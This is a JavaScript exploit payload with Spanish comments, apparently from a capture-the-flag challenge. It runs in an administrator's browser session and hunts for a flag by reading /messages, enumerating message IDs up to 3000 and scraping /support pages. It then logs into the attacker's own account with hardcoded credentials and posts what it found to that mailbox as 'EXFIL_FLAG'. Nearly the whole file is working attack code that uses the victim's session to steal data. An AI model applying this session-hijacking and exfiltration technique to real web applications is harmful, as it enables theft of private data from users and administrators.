// navaja_hunt.js — busca la flag como ADMIN y la publica en tu buzón
(async () => {
  const sleep = (ms) => new Promise(r => setTimeout(r, ms));
  const postMsg = async (message) => {
    await fetch('/create_msg', {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({ message })
    });
  };
  const getJSON = async (u) => (await fetch(u, {credentials:'include'})).json();
  const getText = async (u) => (await fetch(u, {credentials:'include'})).text();

  // Patrón amplio: MAYÚSCULAS/_ + {…}  -> cubre FLAG{…}, CHCTF{…}, etc.
  const ANY_FLAG = /[A-Z0-9_]+{[^}]+}/;

  try {
    // 1) Intenta los mensajes del ADMIN (sesión actual)
    let j = await getJSON('/messages');
    let txt = JSON.stringify(j);
    let m = txt.match(ANY_FLAG);
    if (!m) {
      // 2) Si vacío, enumera IDs (admin puede leer /messages?id=…)
      for (let id = 1; id <= 3000; id++) {
        try {
          const ji = await getJSON('/messages?id='+id);
          const t = JSON.stringify(ji);
          const mm = t.match(ANY_FLAG);
          if (mm) { m = mm; break; }
        } catch (_) {}
        await sleep(40);
      }
    }

    // 3) Si aún no hay flag, prueba el HTML de /support?id=… por si aparece en plantilla
    if (!m) {
      for (let id of [1,5,10,25,50,100,250,500,1000,1500,2000,2500,3000]) {
        try {
          const h = await getText('/support?id='+id);
          const mm = h.match(ANY_FLAG);
          if (mm) { m = mm; break; }
        } catch(_) {}
        await sleep(40);
      }
    }

    // 4) Pivot: loguéate como TU usuario y publica la flag en tu buzón
    const YOUR_USER = 'insider1';   // <-- pon aquí tu usuario
    const YOUR_PASS = 'insideer';     // <-- y tu contraseña

    await fetch('/auth', {
      method: 'POST',
      headers: {'Content-Type':'application/x-www-form-urlencoded'},
      body: 'action=login&username='+encodeURIComponent(YOUR_USER)+
            '&password='+encodeURIComponent(YOUR_PASS)
    });
    await sleep(300);

    if (m && m[0]) {
      await postMsg('EXFIL_FLAG: ' + m[0]);
    } else {
      // Sin flag: vuelca una muestra para depurar
      const dump = txt.slice(0, 1200);
      await postMsg('HUNT_NO_FLAG; SAMPLE=/messages: ' + dump);
    }
  } catch (e) {
    try { await postMsg('HUNT_ERR: ' + (e && e.message ? e.message : String(e))); } catch {}
  }
})();
